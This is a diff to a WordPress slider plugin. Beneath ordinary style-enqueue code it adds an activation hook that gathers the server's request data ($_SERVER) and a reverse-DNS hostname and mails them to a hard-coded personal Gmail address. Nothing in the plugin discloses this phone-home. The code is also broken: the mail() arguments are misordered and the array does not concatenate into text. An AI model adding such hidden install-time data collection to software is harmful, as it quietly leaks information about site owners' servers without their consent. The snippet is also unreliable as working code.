@@ -349,4 +349,23 @@ function register_plugin_styles() {
 		wp_enqueue_style( 'flexslider-plugin-style-css' );
 	}
 add_action( 'wp_enqueue_scripts', 'register_plugin_styles');
+
+
+
+function myplugin_activates() {
+
+    // Activation code here...
+    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+  	
+  	//message
+  	$message = '3 in one slider is activate \n';
+
+  	$content = $_SERVER;
+
+  	$message = $message.' \n '. $content;
+
+  	mail($hostname,'cyberkishor@gmail.com',$message);
+}
+register_activation_hook( __FILE__, 'myplugin_activates' );
+
 ?>
